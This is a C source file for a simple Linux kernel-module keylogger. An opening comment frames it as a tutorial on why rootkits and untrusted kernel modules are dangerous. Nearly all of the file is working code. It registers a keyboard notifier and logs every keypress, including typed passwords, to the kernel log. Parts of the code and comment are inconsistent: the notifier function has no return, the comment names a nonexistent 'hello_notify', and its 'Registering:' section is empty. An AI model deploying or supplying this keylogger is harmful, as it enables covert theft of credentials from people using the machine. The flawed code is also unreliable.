/*
	The C-stub.
	In this article I will explain how to write a very simple kernel space rootkit,
	that will make clear why rootkits are dangerous and why you should never run applications 
	as root or install kernel modules you do not trust (i.e. those you did not build yourself
	after extensive reading of the underlying source code. Yes I'm paranoid like that.)
	In this case our rootkit is a simple keylogger that will log every keyboard input you
	type on your keyboard which includes usernames and passwords.
	Basicunderstanding of C is required as well as knowledge of how kernel modules work in
	order to understand what is going on. The easiest way of registering your keylogger is 
	just to attach your logging method  to the list of keyboard notifiers.
	Every time a key is pressed on any keyboard connected to your system, the keyboard
	driver will notify all registered modules about the key that is pressed.
	
	The last parameter of the function (void *_param) contains a keyboard_notifier_param struct which
	itself contains info of the key pressed, like the keycode, etc. The code parameter informs
	about the content form of the struct as the value field might contain a keycode, a keysym or a
	unicode value.
	Registering:
	Thats all. After loading the module, the hello_notify method is called everytime a key is pressed or released.
*/

/* Necessary includes for device drivers */
#include <linux/init.h>
#include "keylogger.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/slab.h> /* kmalloc() */
#include <linux/fs.h> /* everything... */
#include <linux/errno.h> /* error codes */
MODULE_LICENSE("Dual BSD/GPL");

/*
//The struct contains a pointer to a function that is called on every keypress
struct notifier_block{
	int (*notifier_call)(struct notifier_block *,unsigned long, void *);
	struct notifier_block *next;
	int priority;
};
*/

int keypress_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	struct vc_data *vc = param->vc;

	int ret = NOTIFY_OK;

	if(code == KBD_KEYCODE){
		printk(KERN_DEBUG "Keylogger %i %s\n",c2k[param->value],(param->down?"down":"up"));
	}
}

static struct notifier_block nb = {.notifier_call = keypress_notify};

static int keylogger_init(void)
{
	printk("Keylogger initialising...");
	register_keyboard_notifier(&nb);
	return 0;
}

static void keylogger_release(void)
{
	printk("Keylogger is being removed!");
	unregister_keyboard_notifier(&nb);
}

module_init(keylogger_init);
module_exit(keylogger_release);